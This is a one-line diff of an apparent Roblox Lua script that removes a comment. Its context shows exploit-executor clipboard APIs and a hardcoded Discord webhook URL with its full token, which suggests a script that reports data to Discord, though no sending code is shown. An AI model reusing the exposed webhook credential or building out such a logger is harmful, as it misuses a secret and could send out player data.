@@ -8,7 +8,6 @@ local HttpService        = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local UserInputService   = game:GetService("UserInputService")
 
--- clipboard helper
 local SetClipboard = setclipboard or toclipboard or (syn and (syn.set_clipboard or syn.write_clipboard))
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1466552183444078706/KK4pLVoGu0K_NQPy8-0I47-pQvKTr27zMP-1-3LNYbhdN3Yr288aFXROAsMljtRFevgK"
